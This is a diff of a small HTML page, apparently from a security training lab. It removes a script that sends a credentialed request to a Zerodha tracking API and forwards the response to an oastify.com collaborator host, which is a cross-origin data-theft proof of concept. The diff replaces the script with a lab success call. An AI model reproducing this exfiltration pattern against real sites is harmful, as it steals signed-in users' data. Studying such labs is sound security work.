@@ -2,30 +2,7 @@
 <html>
 <body>
 <script>
-  fetch("https://rb.zerodha.com/api/track", {
-    method: "POST",
-    credentials: "include",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      site_id: "55f47de6ae18",
-      hostname: "cashier.zerodha.com",
-      pathname: "/",
-      screenWidth: 1512,
-      screenHeight: 982,
-      language: "en-US",
-      page_title: "Zerodha",
-      referrer: "",
-      type: "pageview",
-      event_name: ""
-    })
-  })
-  .then(r => r.json())
-  .then(data => {
-    navigator.sendBeacon(
-      "https://b6ifhbrqacsdkluvym5t0okh2880wwkl.oastify.com/log",
-      JSON.stringify(data)
-    );
-  })
+  hextree.success(true);
 </script>
 </body>
 </html>
